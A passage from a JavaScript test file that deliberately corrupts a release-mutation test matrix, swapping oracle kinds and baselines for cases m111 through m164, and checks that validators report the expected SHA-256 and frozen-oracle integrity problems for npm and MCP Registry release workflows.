      stagedWithoutRemaining,
      sharedRegistryMatcherLoop,
      [stagedRemainingBlock, sharedRegistryMatcherLoop].join("\n")
    );
    expect(crossGenerationMutationProblems(earlyStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid global case execution order must equal exact frozen primary-oracle order/
        )
      ])
    );
    const npmEvaluatorPrimaryMatcherTail = [
      "      expect(npmProvenanceEvaluatorProblems(weakenedProvenanceEvaluator)).toContain(NPM_PROVENANCE_CONTRACT_PROBLEM);",
      "    }"
    ].join("\n");
    const lateStagedRemaining = replaceExactly(
      stagedWithoutRemaining,
      npmEvaluatorPrimaryMatcherTail,
      `${npmEvaluatorPrimaryMatcherTail}\n${stagedRemainingBlock}`
    );
    expect(crossGenerationMutationProblems(lateStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid global case execution order must equal exact frozen primary-oracle order/
        )
      ])
    );

    // NEGATIVE control: m111 shares m035's raw mutation tuple and materialized mutant,
    // but its frozen Registry-step integrity oracle must never collapse to m035's evaluator.
    const m111EvaluatorInvocation = replaceExactly(
      matrixSource,
      [
        '            kind: "registry.step.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM111,",
        "            run: registryPublishStepSource"
      ].join("\n"),
      [
        '            kind: "registry.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM111"
      ].join("\n")
    );
    const conflatedM111WithM035Oracle = replaceExactly(
      m111EvaluatorInvocation,
      [
        '            id: "release.expectation.m111.primary",',
        '            kind: "problem",',
        "            problem:",
        '              "stable MCP Registry publication must bind exact source manifests, one pinned publisher write, and bounded readback"'
      ].join("\n"),
      [
        '            id: "release.expectation.m111.primary",',
        '            kind: "problem",',
        "            problem:",
        '              "MCP Registry reconciliation must retain exact identity, lifecycle, absence, and convergence semantics"'
      ].join("\n")
    );
    const transplantedM112Invocation = replaceExactly(
      conflatedM111WithM035Oracle,
      [
        '            kind: "npm.contract.release",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM112,",
        "            integrity: releaseIntegritySource"
      ].join("\n"),
      [
        '            kind: "npm.contract.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM112,",
        "            release: releaseWorkflowFixtureSource"
      ].join("\n")
    );
    const conflatedReleaseOracles = replaceExactly(
      transplantedM112Invocation,
      [
        '            kind: "npm.contract.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM113,",
        "            release: releaseWorkflowFixtureSource"
      ].join("\n"),
      [
        '            kind: "npm.contract.release",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM113,",
        "            integrity: releaseIntegritySource"
      ].join("\n")
    );
    const conflatedM114NpmOracle = replaceExactly(
      conflatedReleaseOracles,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM114"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM114"
      ].join("\n")
    );
    const conflatedM115NpmOracle = replaceExactly(
      conflatedM114NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM115"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM115"
      ].join("\n")
    );
    const conflatedM116NpmOracle = replaceExactly(
      conflatedM115NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM116"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM116"
      ].join("\n")
    );
    const conflatedM117NpmOracle = replaceExactly(
      conflatedM116NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM117"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM117"
      ].join("\n")
    );
    const conflatedM118NpmOracle = replaceExactly(
      conflatedM117NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM118"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM118"
      ].join("\n")
    );
    const conflatedM119NpmOracle = replaceExactly(
      conflatedM118NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM119"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM119"
      ].join("\n")
    );
    const conflatedM120NpmOracle = replaceExactly(
      conflatedM119NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM120"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM120"
      ].join("\n")
    );
    const conflatedM121NpmOracle = replaceExactly(
      conflatedM120NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM121"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM121"
      ].join("\n")
    );
    const conflatedM122NpmOracle = replaceExactly(
      conflatedM121NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM122"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM122"
      ].join("\n")
    );
    const conflatedM123NpmOracle = replaceExactly(
      conflatedM122NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM123"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM123"
      ].join("\n")
    );
    const conflatedM124NpmOracle = replaceExactly(
      conflatedM123NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM124"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM124"
      ].join("\n")
    );
    const conflatedM125NpmOracle = replaceExactly(
      conflatedM124NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM125"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM125"
      ].join("\n")
    );
    const conflatedM126NpmOracle = replaceExactly(
      conflatedM125NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM126"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM126"
      ].join("\n")
    );
    const conflatedM127NpmOracle = replaceExactly(
      conflatedM126NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM127"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM127"
      ].join("\n")
    );
    const conflatedM128NpmOracle = replaceExactly(
      conflatedM127NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM128"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM128"
      ].join("\n")
    );
    const conflatedM129NpmOracle = replaceExactly(
      conflatedM128NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM129"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM129"
      ].join("\n")
    );
    const conflatedM130NpmOracle = replaceExactly(
      conflatedM129NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM130"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM130"
      ].join("\n")
    );
    const conflatedM131NpmOracle = replaceExactly(
      conflatedM130NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM131"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM131"
      ].join("\n")
    );
    const conflatedM132NpmOracle = replaceExactly(
      conflatedM131NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM132"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM132"
      ].join("\n")
    );
    const conflatedM133NpmOracle = replaceExactly(
      conflatedM132NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM133"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM133"
      ].join("\n")
    );
    const conflatedM134NpmOracle = replaceExactly(
      conflatedM133NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM134"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM134"
      ].join("\n")
    );
    const conflatedM135NpmOracle = replaceExactly(
      conflatedM134NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM135"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM135"
      ].join("\n")
    );
    const conflatedM136NpmOracle = replaceExactly(
      conflatedM135NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM136"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM136"
      ].join("\n")
    );
    const conflatedM137NpmOracle = replaceExactly(
      conflatedM136NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM137"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM137"
      ].join("\n")
    );
    const conflatedM138NpmOracle = replaceExactly(
      conflatedM137NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM138"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM138"
      ].join("\n")
    );
    const conflatedM140SourceHandle = replaceExactly(
      conflatedM138NpmOracle,
      "      source: npmProvenanceAuditCommandSource,",
      "      source: releaseWorkflowFixtureSource,"
    );
    const conflatedM139ReplacementDependency = replaceExactly(
      conflatedM140SourceHandle,
      m139ReplacementDependencyBlock,
      [m139NeedleLine, "      replacement: releaseMutationM138,"].join("\n")
    );
    const conflatedM139NpmOracle = replaceExactly(
      conflatedM139ReplacementDependency,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM139"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM139"
      ].join("\n")
    );
    const conflatedM141NpmOracle = replaceExactly(
      conflatedM139NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM141"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM141"
      ].join("\n")
    );
    const conflatedM142NpmOracle = replaceExactly(
      conflatedM141NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM142"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM142"
      ].join("\n")
    );
    const conflatedM143NpmOracle = replaceExactly(
      conflatedM142NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM143"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM143"
      ].join("\n")
    );
    const conflatedM145SourceHandle = replaceExactly(
      conflatedM143NpmOracle,
      "      source: npmProvenanceEvaluatorCommandSource,",
      "      source: releaseWorkflowFixtureSource,"
    );
    const conflatedM144ReplacementDependency = replaceExactly(
      conflatedM145SourceHandle,
      m144ReplacementDependencyBlock,
      [m144NeedleLine, "      replacement: releaseMutationM143,"].join("\n")
    );
    const conflatedM144NpmOracle = replaceExactly(
      conflatedM144ReplacementDependency,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM144"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM144"
      ].join("\n")
    );
    const conflatedM146NpmOracle = replaceExactly(
      conflatedM144NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM146"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM146"
      ].join("\n")
    );
    const conflatedM147NpmOracle = replaceExactly(
      conflatedM146NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM147"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM147"
      ].join("\n")
    );
    const conflatedM148NpmOracle = replaceExactly(
      conflatedM147NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM148"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM148"
      ].join("\n")
    );
    const conflatedM149NpmOracle = replaceExactly(
      conflatedM148NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM149"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM149"
      ].join("\n")
    );
    const conflatedM150NpmOracle = replaceExactly(
      conflatedM149NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM150"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM150"
      ].join("\n")
    );
    const conflatedM151NpmOracle = replaceExactly(
      conflatedM150NpmOracle,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM151"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM151"
      ].join("\n")
    );
    const conflatedM152NpmOracle = replaceExactly(
      conflatedM151NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM152"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM152"
      ].join("\n")
    );
    const conflatedM153NpmOracle = replaceExactly(
      conflatedM152NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM153"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM153"
      ].join("\n")
    );
    const conflatedM154NpmOracle = replaceExactly(
      conflatedM153NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM154"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM154"
      ].join("\n")
    );
    const conflatedM155NpmOracle = replaceExactly(
      conflatedM154NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM155"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM155"
      ].join("\n")
    );
    const conflatedM156NpmOracle = replaceExactly(
      conflatedM155NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM156"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM156"
      ].join("\n")
    );
    const conflatedM157NpmOracle = replaceExactly(
      conflatedM156NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM157"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM157"
      ].join("\n")
    );
    const conflatedM158NpmOracle = replaceExactly(
      conflatedM157NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM158"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM158"
      ].join("\n")
    );
    const conflatedM159NpmOracle = replaceExactly(
      conflatedM158NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM159"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM159"
      ].join("\n")
    );
    const conflatedM160NpmOracle = replaceExactly(
      conflatedM159NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM160"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM160"
      ].join("\n")
    );
    const conflatedM161NpmOracle = replaceExactly(
      conflatedM160NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM161"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM161"
      ].join("\n")
    );
    const conflatedM162NpmOracle = replaceExactly(
      conflatedM161NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM162"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM162"
      ].join("\n")
    );
    const conflatedM163NpmOracle = replaceExactly(
      conflatedM162NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM163"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM163"
      ].join("\n")
    );
    const conflatedNpmOracles = replaceExactly(
      conflatedM163NpmOracle,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM164"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM164"
      ].join("\n")
    );
    expect(historicalMutationProblems(conflatedNpmOracles)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m140 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m139 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m145 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m144 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m111 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m111 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m112 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m112 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m113 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m113 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m114 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m114 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m115 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m115 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m116 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m116 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m117 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m117 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m118 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m118 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m119 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m119 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m120 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m120 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m121 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m121 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m122 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m122 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m123 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m123 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m124 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m124 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m125 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m125 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m126 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m126 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m127 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m127 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m128 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m128 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m129 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m129 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m130 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m130 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m131 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m131 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m132 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m132 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m133 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m133 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m134 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m134 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m135 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m135 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m136 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m136 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m137 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m137 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m138 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m138 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m139 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m139 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m141 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m141 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m142 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m142 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m143 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m143 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m144 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m144 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m146 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m146 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m147 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m147 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m148 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m148 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m149 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m149 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m150 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m150 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m151 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m151 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m152 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m152 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m153 invocation must retain its exact frozen oracle adapter/
        ),
